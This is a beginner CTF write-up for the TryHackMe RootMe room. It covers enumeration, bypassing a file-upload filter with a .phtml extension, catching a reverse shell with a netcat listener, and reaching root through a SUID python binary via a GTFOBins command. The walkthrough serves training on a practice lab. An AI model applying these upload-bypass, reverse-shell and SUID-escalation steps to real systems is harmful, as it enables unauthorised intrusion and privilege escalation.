# RootMe - TryHackMe Writeup

## 🚩 Room Information
- **Link:** [TryHackMe - RootMe](https://tryhackme.com/room/r00tme)
- **Difficulty:** Easy
- **Category:** Web Exploitation / Privilege Escalation

---

## 📝 Summary
RootMe is a CTF for beginners, focusing on web exploitation and privilege escalation. The goal is to get a reverse shell using a file upload bypass and then escalate privileges via SUID binaries.

## 🛠️ Tools Used
- Nmap
- Gobuster
- PHP Reverse Shell (PentestMonkey)
- Python (for PTY)

---

## 🔍 Task Walkthrough

### Task 1: Enumeration
IP: `<target_ip>`

```bash
nmap -sV <target_ip>
```
- **Port 80 (HTTP)**
- **Port 22 (SSH)**

Running Gobuster:
```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```
Directories found:
- `/panel/` (Upload page)
- `/uploads/` (Where uploaded files are stored)

### Task 2: Getting a Shell
I tried uploading a `.php` reverse shell, but it was blocked. I bypassed it by renaming the file to `.phtml`.

1. Prepared the shell (changing IP/Port).
2. Uploaded `shell.phtml` via `/panel/`.
3. Started a Netcat listener: `nc -lvnp 1234`.
4. Accessed the shell at `http://<target_ip>/uploads/shell.phtml`.

Success! I got a shell as `www-data`.

#### Finding user.txt
```bash
find / -name user.txt 2>/dev/null
cat /var/www/user.txt
```

### Task 3: Privilege Escalation
I searched for SUID files:
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
Found: `/usr/bin/python` is SUID!

According to [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid), I can escalate using:
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

I am now root.

#### Finding root.txt
```bash
cat /root/root.txt
```

---

## 🏁 Conclusion
A classic room focusing on file upload bypass and SUID privilege escalation. Always check GTFOBins when you find interesting SUID binaries!

---
*Created by [Amit Padhan](https://github.com/amitpadhan525)*
